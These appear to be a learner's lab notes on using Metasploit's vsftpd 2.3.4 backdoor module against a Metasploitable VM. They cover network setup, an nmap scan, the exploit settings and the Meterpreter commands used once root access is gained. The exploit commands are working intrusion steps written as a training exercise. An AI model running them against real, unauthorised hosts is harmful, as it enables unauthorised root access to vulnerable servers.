Summary in English
Commands used

Network setup

ip a                                                    # view interfaces and IPs
sudo ip link set eth0 up                                # bring interface up
sudo ip addr add 192.168.100.10/24 dev eth0              # static IP on Kali
sudo ifconfig eth0 192.168.100.20 netmask 255.255.255.0 up  # static IP on Metasploitable (older, equivalent syntax)
ping -c 3 192.168.100.20                                 # check connectivity

Reconnaissance

nmap -sV -sC -T5 192.168.100.20   # version detection + default scripts

Exploitation (Metasploit)

use exploit/unix/ftp/vsftpd_234_backdoor
set rhosts 192.168.100.20
set lhost 192.168.100.10
set ForceExploit true     # only needed because port 6200 still showed as in use
run

Post-exploitation (Meterpreter)

getuid      # user the session is running as
shell       # drop into a real Linux shell inside the session
whoami
ip a
exit        # leave the shell / the session
Key takeaways
Internal networks without DHCP: machines don't get an IP automatically; it must be set manually, and both hosts need to be on the same subnet to see each other.
ip vs ifconfig: two tools for the same job; ip is the modern one, ifconfig the classic one (still present on older systems like Metasploitable).
Reading an Nmap scan: identifying services, versions, and risk (known backdoors, unencrypted protocols, outdated software).
RHOSTS vs LHOST: who you're attacking vs. who receives the callback connection; Metasploit validates payload options even when a given exploit doesn't use all of them the same way.
Exploit state on the target: a backdoor can get "used up" after one trigger; reading Metasploit's messages carefully tells you whether it's a config error or a service-state issue, and restarting the service/VM fixes it.
Meterpreter isn't a Linux shell: it has its own command set (getuid, shell, etc.); shell drops you into real OS commands.
Inherited privileges: direct root access doesn't always require a privilege-escalation exploit — sometimes the vulnerable service is already running as root.
